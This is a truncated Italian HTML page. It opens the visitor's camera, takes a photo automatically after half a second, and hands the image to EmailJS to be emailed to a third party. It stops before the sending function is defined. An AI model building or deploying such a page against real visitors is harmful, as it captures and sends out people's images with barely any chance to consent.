<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Scatta la Foto</title>
    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
</head>
<body>
    <h2>La foto verrà scattata automaticamente in 0.5 secondi!</h2>
    <video id="video" width="300" height="200" autoplay></video>
    <canvas id="canvas" width="300" height="200" style="display:none;"></canvas>
    <img id="photo" src="" alt="Foto">

    <script>
        // Inizializza EmailJS
        emailjs.init("YOUR_USER_ID"); // Aggiungi qui il tuo USER_ID

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const photo = document.getElementById('photo');

        // Ottieni la fotocamera del dispositivo
        navigator.mediaDevices.getUserMedia({ video: true })
            .then((stream) => {
                video.srcObject = stream;

                // Dopo 0.5 secondi, scatta la foto automaticamente
                setTimeout(function() {
                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const dataUrl = canvas.toDataURL('image/png');
                    photo.src = dataUrl; // Mostra la foto sulla pagina

                    // Invia l'immagine tramite EmailJS
                    sendEmail(dataUrl);
                }, 500); // 500ms = 0.5 secondi
            })
            .catch((err) => console.log('Errore nell\'accesso alla fotocamera: ' + err));

        // Funzione per inviare la foto tramite email
